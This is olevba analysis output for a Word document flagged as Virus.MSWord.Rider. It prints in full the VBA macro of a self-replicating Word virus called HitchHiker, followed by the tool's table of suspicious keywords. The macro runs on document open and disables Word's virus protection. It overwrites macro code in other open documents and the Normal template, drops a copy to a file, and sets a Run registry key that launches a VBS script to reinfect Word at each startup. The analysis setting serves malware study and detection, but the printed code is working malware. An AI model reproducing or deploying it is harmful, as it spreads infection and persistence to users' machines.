olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rider
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rider - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Options.VirusProtection = (0 - 0): Options.ConfirmConversions = (1 - 1)
If MacroContainer.FullName = NormalTemplate.FullName Then GoTo BusStation Else GoTo HighWay
BusStation: ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Windows\HitchHiker"
ActiveDocument.VBProject.Description = "I'm Here For The Ride...": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: End
HighWay: If Documents.Count > 1 Then
A = Documents.Count: B = Int(Rnd * A): If B = 0 Then B = 1
If Documents.Item(B).VBProject.Description = "I'm Here For The Ride..." Then GoTo HighWay
C = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.AddFromString C: Documents.Item(B).VBProject.Description = "I'm Here For The Ride..."
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
MacroContainer.VBProject.Description = "": MacroContainer.SaveAs FileName:=MacroContainer.FullName: Documents.Item(B).SaveAs FileName:=Documents.Item(B).FullName
Open "C:\Windows\HitchHiker" For Output As #1: Print #1, C: Close #1: End If
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "") = "C:\WINDOWS\HitchHiker.vbs"
Open "C:\WINDOWS\HitchHiker.vbs" For Output As #1: Print #1, "Set HitchHiker = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "For x = 1 To HitchHiker.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "HitchHiker.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1": Print #1, "Next"
Print #1, "HitchHiker.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\HitchHiker" & Chr(34) & ")"
Print #1, "HitchHiker.Application.Quit": Close #1: End Sub
'HitchHiker~By~Lys~KovicK
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |HitchHiker.vbs      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

